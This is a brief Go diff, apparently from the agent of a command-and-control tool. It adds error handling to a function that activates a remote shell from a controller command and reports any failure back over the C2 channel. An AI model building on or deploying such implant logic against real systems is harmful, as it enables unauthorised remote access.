@@ -55,7 +55,12 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 			token := cmdSlice[1]
-			ActivateShell(token)
+			err = ActivateShell(token)
+			if err != nil {
+				out = err.Error()
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
+			}
 			return
 		}
 
